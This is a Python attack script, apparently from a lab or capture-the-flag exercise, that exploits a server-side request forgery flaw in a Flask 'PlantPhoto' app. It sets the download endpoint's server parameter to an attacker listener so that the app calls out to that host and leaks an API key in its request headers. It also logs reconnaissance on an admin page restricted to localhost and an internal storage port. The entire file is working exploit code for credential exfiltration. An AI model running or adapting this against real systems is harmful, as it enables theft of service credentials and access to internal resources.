"""Trigger SSRF and log everything."""
import requests
import datetime
import sys

T = "http://10.82.168.213"
ATTACKER = "10.82.105.71"
PORT = 9999
LOG_FILE = "plantphoto_hunt/log.txt"

lines = []

def l(msg):
    print(msg)
    lines.append(msg)

l(f"=== PlantPhoto SSRF Hunt Log - {datetime.datetime.now()} ===")
l("")
l(f"[RECON] Target: {T}")
l("[RECON] Backend: Werkzeug/0.16.0 Python/3.10.7 (Flask + pycurl)")
l("[RECON] URL pattern built by app: http://{server}/public-docs-k057230990384293/{id}.pdf")
l('[RECON] /admin -> 200: "Admin interface only available from localhost!!!"')
l("[RECON] Internal port 8087 open (secure file storage)")
l("[RECON] Endpoints found: /, /admin, /download, /static/imgs/*")
l("")

# Trigger SSRF to attacker listener
l(f"[SSRF] Triggering SSRF -> {ATTACKER}:{PORT}")
url = f"{T}/download?server={ATTACKER}:{PORT}&id=1"
l(f"[SSRF] Request URL: {url}")
l(f"[SSRF] App will call: http://{ATTACKER}:{PORT}/public-docs-k057230990384293/1.pdf")
l("")

try:
    r = requests.get(url, timeout=15)
    l(f"[SSRF] Response status: {r.status_code}")
    l(f"[SSRF] Response headers: {dict(r.headers)}")
    body_preview = r.text[:500]
    l(f"[SSRF] Response body (first 500 chars): {body_preview}")
except Exception as e:
    l(f"[SSRF] Error: {e}")

l("")
l(">>> CHECK YOUR LISTENER OUTPUT FOR THE API KEY IN THE REQUEST HEADERS <<<")
l(">>> Look for: Authorization, X-API-Key, Api-Key, or similar headers <<<")

with open(LOG_FILE, "w", encoding="utf-8") as f:
    f.write("\n".join(lines))

print(f"\n[*] Log saved to {LOG_FILE}")
